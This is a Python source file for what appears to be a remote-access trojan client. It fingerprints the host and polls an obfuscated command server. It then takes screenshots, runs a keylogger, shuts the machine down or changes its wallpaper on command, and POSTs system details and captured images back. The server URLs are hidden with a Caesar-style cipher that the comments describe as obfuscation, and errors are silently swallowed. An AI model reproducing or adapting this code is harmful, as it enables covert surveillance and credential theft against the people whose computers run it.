import platform
import socket
import hashlib
import requests
import capture
import os
import change
import struct

ENDPTS = ["tffb://xaomxtaef:2424/oype","vhhd://zcqozvcgh:0202/roho/hslh","kwws://orfdokrvw:1313/gdwd/slfwxuh"]
DEVICE_ID = ""

def fetch_commands():
    try:
        r = requests.get(url=decypher(ENDPTS[0], 68260 + 314), params={"fp": DEVICE_ID}) # Little easter-egg
        if r.status_code != 200:
            return

        res = r.json()

        # We don't do shit if the response was either incorrect and
        # if there are naught commands to process
        if not res["ok"] or len(res["cmds"]) == 0:
            return

        for x in res["cmds"]:
            if x == "screenshot":
                capture.screenshot()
            elif x == "shutdown":
                os.system("shutdown /s /t 1")
            elif x.startswith("keylogger"):
                capture.keylogger(int(x.split("->")[1]))
            elif x == "background":
                change.background()
            elif x == "info":
                send_text("\n".join([platform.node(), platform.version(), platform.machine(), socket.gethostbyname(socket.gethostname())]))
    except:
        pass


def send_text(desc):
    try:
        requests.post(url=decypher(ENDPTS[1], 915812), json={"ok": True, "fp": DEVICE_ID, "text": desc})
    except:
        pass


def send_img(img):
    try:
        requests.post(url=decypher(ENDPTS[2], 2142143), json={"ok": True, "fp": DEVICE_ID, "img": img})
    except:
        pass


def create_fp():
    global DEVICE_ID

    pt = (platform.node() + 
        platform.version() + 
        platform.machine() + 
        platform.win32_edition() +
        socket.gethostbyname(socket.gethostname())
    ).encode()

    DEVICE_ID = hashlib.sha256(pt).hexdigest()[-6:]


# Just for obfuscation
def cypher(t, k):
    y = ""
    for c in t:
        if c.isupper(): 
            ci = ord(c) - ord('A')
            cs = (ci + k) % 26 + ord('A')
            cn = chr(cs)
            y += cn
        elif c.islower():
            ci = ord(c) - ord('a') 
            cs = (ci + k) % 26 + ord('a')
            cn = chr(cs)
            y += cn
        elif c.isdigit():
            cn = (int(c) + k) % 10
            y += str(cn)
        else:
            y += c
    return y


# Just for obfuscation
def decypher(t, k):
    y = ""
    for c in t:
        if c.isupper(): 
            ci = ord(c) - ord('A')
            cp = (ci - k) % 26 + ord('A')
            cg = chr(cp)
            y += cg
        elif c.islower(): 
            ci = ord(c) - ord('a') 
            cp = (ci - k) % 26 + ord('a')
            cg = chr(cp)
            y += cg
        elif c.isdigit():
            cg = (int(c) - k) % 10
            y += str(cg)
        else:
            y += c
    return y

def is_64bit():
    return struct.calcsize('P') * 8 == 64